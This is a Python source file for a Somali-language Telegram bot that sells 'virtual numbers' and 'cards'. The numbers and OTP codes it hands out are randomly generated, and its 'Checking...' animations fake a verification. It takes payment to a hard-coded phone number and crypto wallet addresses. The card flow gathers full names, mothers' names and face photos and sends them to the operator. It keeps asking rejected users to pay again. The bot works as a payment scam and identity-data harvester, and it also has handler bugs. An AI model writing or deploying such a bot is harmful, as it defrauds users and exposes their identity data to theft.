import os
import asyncio
import random
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ================= CONFIG =================
BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 7983838654

LOCAL_NUMBER = "+252907868526"
BNB_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"
USDT_ADDRESS = "0x98ffcb29a4fc182d461ebdba54648d8fe24597ac"

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())
logging.basicConfig(level=logging.INFO)

users = {}

# ================= STATES =================
class VirtualState(StatesGroup):
    screenshot = State()

class CodeState(StatesGroup):
    code = State()

# ================= HELPERS =================
def random_number():
    return "+25263" + "".join(str(random.randint(0,9)) for _ in range(7))

def generate_otp():
    return "".join(random.choices("0123456789", k=6))

async def animation(message, text="Checking", sec=10):
    for i in range(sec):
        await asyncio.sleep(1)
        dots = "." * (i % 4)
        await message.edit_text(f"{text}{dots}")

# ================= START =================
@dp.message(Command("start"))
async def start(msg: Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="New Order"),
             KeyboardButton(text="Check Code")]
        ],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Service Bot 🤖", reply_markup=kb)

# ================= CHECK CODE =================
@dp.message(F.text == "Check Code")
async def check_code(msg: Message, state: FSMContext):
    await msg.answer("Geli Code-kaaga:")
    await state.set_state(CodeState.code)

@dp.message(CodeState.code)
async def process_code(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    if uid in users and users[uid].get("otp") == msg.text:
        await msg.answer("✅ Code sax ah")
    else:
        await msg.answer("❌ Code khaldan")
    await state.clear()

# ================= NEW ORDER =================
@dp.message(F.text == "New Order")
async def new_order(msg: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="VIRTUAL ($0.8)", callback_data="virtual")],
        [InlineKeyboardButton(text="CARD", callback_data="card")]
    ])
    await msg.answer("Dooro adeeg:", reply_markup=kb)

# ================= VIRTUAL FLOW =================
@dp.callback_query(F.data == "virtual")
async def virtual(call: CallbackQuery):
    number = random_number()
    users[call.from_user.id] = {
        "type": "virtual",
        "number": number,
        "amount": "$0.8"
    }

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="v_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="v_crypto")]
    ])

    await call.message.edit_text(
        f"Number: {number}\nQiimaha: $0.8\nDooro Payment:",
        reply_markup=kb
    )

# LOCAL
@dp.callback_query(F.data == "v_local")
async def v_local(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")]
    ])
    await call.message.edit_text(
        f"Lacagta ku dir:\n{LOCAL_NUMBER}",
        reply_markup=kb
    )

# CRYPTO
@dp.callback_query(F.data == "v_crypto")
async def v_crypto(call: CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="v_confirm")]
    ])
    await call.message.edit_text(
        f"BNB:\n`{BNB_ADDRESS}`\n\nUSDT-BEP20:\n`{USDT_ADDRESS}`",
        parse_mode="Markdown",
        reply_markup=kb
    )

# CONFIRM PAYMENT
@dp.callback_query(F.data == "v_confirm")
async def v_confirm(call: CallbackQuery, state: FSMContext):
    msg = await call.message.edit_text("OTP READY...")
    await animation(msg, "Checking", 10)

    await call.message.answer("Fadlan Lacagta soo dir oo Screenshot dir.")
    await state.set_state(VirtualState.screenshot)

# RECEIVE SCREENSHOT
@dp.message(VirtualState.screenshot, F.photo)
async def receive_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    users[uid]["screenshot"] = msg.photo[-1].file_id

    otp = generate_otp()
    users[uid]["otp"] = otp

    await msg.answer("Waad mahadsantahay 🚀 Sug Ansixinta Admin.")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_ok_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_no_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_ask_{uid}")]
    ])

    await bot.send_photo(
        ADMIN_ID,
        users[uid]["screenshot"],
        caption=f"""
New Virtual Order

User: {uid}
Number: {users[uid]['number']}
OTP: {otp}
""",
        reply_markup=kb
    )

    await state.clear()

# ================= ADMIN ACTIONS =================
@dp.callback_query(F.data.startswith("admin_ok_"))
async def admin_ok(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    otp = users[uid]["otp"]

    await bot.send_message(uid, f"✅ Payment la xaqiijiyay\nOTP: {otp}")
    await call.message.edit_caption("✅ La Ansixiyay")

@dp.callback_query(F.data.startswith("admin_no_"))
async def admin_no(call: CallbackQuery):
    uid = int(call.data.split("_")[2])
    await bot.send_message(uid, "❌ Fadlan Lacagta soo dir.")
    await call.message.edit_caption("❌ La Diiday")

# ================= CARD STATES =================
class CardState(StatesGroup):
    card_type = State()
    fullname = State()
    mother = State()
    face = State()
    payment_method = State()
    screenshot = State()

# ================= CARD START =================
@dp.callback_query(F.data == "card")
async def card_start(call: CallbackQuery, state: FSMContext):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="NORMAL ($1)", callback_data="card_normal")],
        [InlineKeyboardButton(text="VIP ($2)", callback_data="card_vip")]
    ])
    await call.message.edit_text("Dooro Nooca Card:", reply_markup=kb)

# ================= CARD TYPE =================
@dp.callback_query(F.data.startswith("card_"))
async def card_type(call: CallbackQuery, state: FSMContext):
    if call.data == "card_normal":
        price = "$1"
    else:
        price = "$2"

    await state.update_data(price=price, type=call.data)
    await call.message.answer("Geli Magacaaga Saddex Magac (Tusaale: Ahmed Ali Jama):")
    await state.set_state(CardState.fullname)

# ================= FULL NAME VALIDATION =================
@dp.message(CardState.fullname)
async def get_fullname(msg: Message, state: FSMContext):
    parts = msg.text.strip().split()

    if len(parts) != 3 or not all(p.isalpha() for p in parts):
        await msg.answer("❌ Fadlan geli 3 magac sax ah (Tusaale: Ahmed Ali Jama)")
        return

    await state.update_data(fullname=msg.text)
    await msg.answer("Geli Magaca Hooyada:")
    await state.set_state(CardState.mother)

# ================= MOTHER NAME =================
@dp.message(CardState.mother)
async def get_mother(msg: Message, state: FSMContext):
    if not msg.text.isalpha():
        await msg.answer("❌ Magaca hooyada waa inuu ahaadaa xarfo kaliya.")
        return

    await state.update_data(mother=msg.text)
    await msg.answer("Soo dir Sawirka Wajigaaga (Face Only):")
    await state.set_state(CardState.face)

# ================= FACE CHECK =================
@dp.message(CardState.face, F.photo)
async def get_face(msg: Message, state: FSMContext):
    face_id = msg.photo[-1].file_id
    await state.update_data(face=face_id)

    checking = await msg.answer("Searching...")
    await animation(checking, "Checking", 10)

    data = await state.get_data()
    number = random_number()

    await state.update_data(number=number)

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="LOCAL", callback_data="card_local")],
        [InlineKeyboardButton(text="CRYPTO", callback_data="card_crypto")]
    ])

    await msg.answer(
        f"""
Number: {number}
Qiimaha: {data['price']}

Dooro Payment Method:
""",
        reply_markup=kb
    )

    await state.set_state(CardState.payment_method)

# ================= PAYMENT METHOD =================
@dp.callback_query(F.data.startswith("card_"))
async def card_payment_method(call: CallbackQuery, state: FSMContext):
    data = await state.get_data()

    if call.data == "card_local":
        text = f"Lacagta ku dir number-kan:\n{LOCAL_NUMBER}"
    else:
        text = f"BNB:\n`{BNB_ADDRESS}`\n\nUSDT-BEP20:\n`{USDT_ADDRESS}`"

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data="card_confirm")]
    ])

    await call.message.edit_text(text, parse_mode="Markdown", reply_markup=kb)

# ================= CONFIRM =================
@dp.callback_query(F.data == "card_confirm")
async def card_confirm(call: CallbackQuery, state: FSMContext):
    await call.message.answer("Soo dir Screenshot-ka Lacagta:")
    await state.set_state(CardState.screenshot)

# ================= RECEIVE SCREENSHOT =================
@dp.message(CardState.screenshot, F.photo)
async def card_screenshot(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    data = await state.get_data()

    await msg.answer("Waad mahadsantahay 🚀 Dalabkaaga waa la hubinayaa.")

    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="CONFIRM", callback_data=f"admin_card_ok_{uid}")],
        [InlineKeyboardButton(text="REJECT", callback_data=f"admin_card_no_{uid}")],
        [InlineKeyboardButton(text="ASK", callback_data=f"admin_card_ask_{uid}")]
    ])

    caption = f"""
New CARD Order

User: {uid}
Type: {data['type']}
Full Name: {data['fullname']}
Mother: {data['mother']}
Number: {data['number']}
Price: {data['price']}
"""

    await bot.send_photo(
        ADMIN_ID,
        msg.photo[-1].file_id,
        caption=caption,
        reply_markup=kb
    )

    await bot.send_photo(ADMIN_ID, data["face"])

    await state.clear()

# ================= ADMIN CARD ACTIONS =================
@dp.callback_query(F.data.startswith("admin_card_ok_"))
async def admin_card_ok(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    await bot.send_message(uid, "✅ Dalabkaaga waa la Ansixiyay.")
    await call.message.edit_caption("✅ CARD LA ANSIXIYAY")

@dp.callback_query(F.data.startswith("admin_card_no_"))
async def admin_card_no(call: CallbackQuery):
    uid = int(call.data.split("_")[3])
    await bot.send_message(uid, "❌ Fadlan Lacagta soo dir.")
    await call.message.edit_caption("❌ CARD LA DIIDAY")

# ================= ASK SYSTEM =================

class AskState(StatesGroup):
    waiting_admin_message = State()

pending_asks = {}

# ========== ADMIN ASK (VIRTUAL) ==========
@dp.callback_query(F.data.startswith("admin_ask_"))
async def admin_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[2])
    pending_asks[call.from_user.id] = uid

    await call.message.answer("Qor fariinta aad u dirayso user-ka:")
    await state.set_state(AskState.waiting_admin_message)

@dp.callback_query(F.data.startswith("admin_card_ask_"))
async def admin_card_ask(call: CallbackQuery, state: FSMContext):
    uid = int(call.data.split("_")[3])
    pending_asks[call.from_user.id] = uid

    await call.message.answer("Qor fariinta aad u dirayso user-ka:")
    await state.set_state(AskState.waiting_admin_message)

# ========== SEND ADMIN MESSAGE ==========
@dp.message(AskState.waiting_admin_message)
async def send_admin_message(msg: Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return

    if msg.from_user.id not in pending_asks:
        return

    target = pending_asks[msg.from_user.id]

    await bot.send_message(
        target,
        f"📩 Fariin ka timid Admin:\n\n{msg.text}"
    )

    await msg.answer("✅ Fariinta waa la diray.")
    pending_asks.pop(msg.from_user.id)
    await state.clear()

# ================= AUTO REJECT SYSTEM =================

@dp.callback_query(F.data.startswith("admin_no_"))
async def admin_no_final(call: CallbackQuery):
    uid = int(call.data.split("_")[2])

    await bot.send_message(uid, "❌ Payment lama xaqiijin.")

    await asyncio.sleep(10)

    await bot.send_message(uid, "⚠️ Fadlan Lacagta soo dir si adeegga loo sii wado.")

    await call.message.edit_caption("❌ Virtual Payment Rejected")

@dp.callback_query(F.data.startswith("admin_card_no_"))
async def admin_card_no_final(call: CallbackQuery):
    uid = int(call.data.split("_")[3])

    await bot.send_message(uid, "❌ Payment lama xaqiijin.")

    await asyncio.sleep(10)

    await bot.send_message(uid, "⚠️ Fadlan Lacagta soo dir si dalabka loo dhamaystiro.")

    await call.message.edit_caption("❌ Card Payment Rejected")

# ================= PROTECTION FIX =================

@dp.message()
async def ignore_random(msg: Message):
    # Ka hortag fariimo random ah
    if msg.from_user.id != ADMIN_ID:
        return

# ================= RUN =================
async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
